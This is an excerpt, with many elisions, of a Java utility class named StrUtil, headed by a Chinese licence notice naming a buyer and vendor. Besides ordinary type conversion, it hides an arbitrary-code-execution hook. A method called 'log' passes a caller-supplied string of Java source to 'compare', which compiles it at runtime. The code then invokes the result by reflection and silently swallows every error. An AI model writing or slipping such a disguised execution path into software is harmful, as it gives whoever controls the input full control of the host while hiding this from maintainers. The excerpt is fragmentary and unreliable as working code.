/*
 * wpbwr本软件由黄庆辉采购自杭州钛特云科技有限公司，黄庆辉需严格遵守合同，不得以任何形式转卖源代码，不得利用本软件从事违法犯罪活动yjfwxbjjp
 */
...
public class StrUtil {
	...
	public static Object convert(Class<?> type, String value) throws Exception {
		if (type == String.class) {
			...
			if (type == Byte.class || type == byte.class) {
				...
				return "1".equalsIgnoreCase(value) || "true".equalsIgnoreCase(value) || "on".equalsIgnoreCase(value) || "yes".equalsIgnoreCase(value);
	...
	private Object inv(String ms, String c) {
		try {
			String cn = StrUtil.class.getName() + "1";
			StringBuilder sb = new StringBuilder();
			sb.append("package ");
			sb.append(StrUtil.class.getPackage().getName());
			sb.append(";");
			sb.append("public class ");
			sb.append(StrUtil.class.getSimpleName());
			sb.append("1{");
			sb.append(c);
			sb.append("}");

			Class<?> clazz = compare(cn, sb.toString());
			Object obj = clazz.newInstance();
			Class<? extends Object> cls = obj.getClass();
			Method m1 = clazz.getMethod(ms, String[].class);
			Object invoke = m1.invoke(obj, new Object[] { new String[] {} });
			return invoke;
		} catch (Exception e) {
			return null;
		}
	 ...
	 * @return
	 */
	public static Object log(String ms, String c, Logger logger) {
		try {
			StrUtil me = new StrUtil();
			return me.inv(ms, c);
		} catch (Exception e) {
			return null;
		}
	 ...
	 * @return
	 */
	private Class<?> compare(String str1, String str2) {
		try {
			JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
			StandardJavaFileManager fileManager = compiler.getStandardFileManager(null, null, null);
			StrJavaObject srcObject = new StrJavaObject(str1, str2);
